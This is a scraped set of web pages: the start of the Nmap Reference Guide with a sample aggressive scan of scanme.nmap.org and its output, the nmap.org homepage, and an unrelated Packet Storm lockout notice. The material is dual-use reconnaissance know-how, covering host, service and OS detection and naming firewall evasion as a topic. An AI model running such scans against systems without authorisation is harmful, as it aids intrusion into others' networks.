* Chapter 15. Nmap Reference Guide

[Prev](data-files-replacing-data-files.html)[Next](man-briefoptions.html)
# Chapter 15. Nmap Reference Guide

Table of Contents

* [Description](man.html#man-description)
* [Options Summary](man-briefoptions.html)
* [Target Specification](man-target-specification.html)
* [Host Discovery](man-host-discovery.html)
* [Port Scanning Basics](man-port-scanning-basics.html)
* [Port Scanning Techniques](man-port-scanning-techniques.html)
* [Port Specification and Scan Order](man-port-specification.html)
* [Service and Version Detection](man-version-detection.html)
* [OS Detection](man-os-detection.html)
* [Nmap Scripting Engine (NSE)](man-nse.html)
* [Timing and Performance](man-performance.html)
* [Firewall/IDS Evasion and Spoofing](man-bypass-firewalls-ids.html)
* [Output](man-output.html)
* [Miscellaneous Options](man-misc-options.html)
* [Runtime Interaction](man-runtime-interaction.html)
* [Examples](man-examples.html)
* [Nmap Book](man-book.html)
* [Bugs](man-bugs.html)
* [Authors](man-author.html)
* [Legal Notices](man-legal.html)
  + [Nmap Copyright and Licensing](man-legal.html#nmap-copyright)
  + [Creative Commons License for this Nmap Guide](man-legal.html#man-copyright)
  + [Source Code Availability and Community Contributions](man-legal.html#source-contrib)
  + [No Warranty](man-legal.html#no-warranty)
  + [Inappropriate Usage](man-legal.html#inappropriate-usage)
  + [Third-Party Software and Funding Notices](man-legal.html#third-party-soft)
  + [United States Export Control](man-legal.html#us-export)
## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.029s latency).
rDNS record for 74.207.244.221: li86-221.members.linode.com
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
| ssh-hostkey: 1024 8d:60:f1:7c:ca:b7:3d:0a:d6:67:54:9d:69:d9:b9:dd (DSA)
|_2048 79:f8:09:ac:d4:e2:32:42:10:49:d3:bd:20:82:85:ec (RSA)
80/tcp   open     http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Go ahead and ScanMe!
646/tcp  filtered ldp
1720/tcp filtered H.323/Q.931
9929/tcp open     nping-echo  Nping echo
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.39
OS details: Linux 2.6.39
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
[Cut first 10 hops for brevity]
11  17.65 ms li86-221.members.linode.com (74.207.244.221)

Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds

```

The newest version of Nmap can be obtained from
[`https://nmap.org`](https://nmap.org). The newest version of this man page
is available at [`https://nmap.org/book/man.html`](https://nmap.org/book/man.html).
It is also included as a chapter of [*Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning*](https://nmap.org/book/).

---

[Prev](data-files-replacing-data-files.html)Using Customized Data Files[Up](toc.html)Nmap Network Scanning[Home](toc.html)[Next](man-briefoptions.html)Options Summary

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from nmap.org_9ba698e9_20250121_013339.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_ca3889a9_20250120_232831.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
